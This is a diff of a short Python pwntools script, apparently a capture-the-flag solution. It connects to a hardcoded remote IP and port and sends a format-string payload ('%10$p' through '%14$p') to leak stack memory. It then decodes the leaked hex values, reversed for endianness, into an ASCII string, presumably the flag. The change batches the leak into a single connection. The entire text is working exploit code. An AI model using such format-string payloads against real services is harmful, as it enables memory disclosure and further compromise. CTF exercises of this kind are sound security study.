@@ -9,14 +9,18 @@ from pwn import *
 # ''')
 
 final = []
-for i in range(10,15):
-    r = remote('140.113.24.241', 30172)
-    r.sendline('%{}$p'.format(i).encode())
-    result = r.recv().decode("ASCII")
-    by_str = bytes.fromhex(result.split("0x")[-1])
+
+r = remote('140.113.24.241', 30172)
+r.sendline('%10$p%11$p%12$p%13$p%14$p'.encode())
+result = r.recv().decode("ASCII").split("0x")
+for rs in result:
+    if rs == "":
+        continue
+    by_str = bytes.fromhex(rs)
+    # reverse for endian
     ascii_str = by_str.decode("ASCII")[::-1]
     final.append(f"{ascii_str}")
-    r.close()
+r.close()
 
 for f in final:
     print(f, end="")
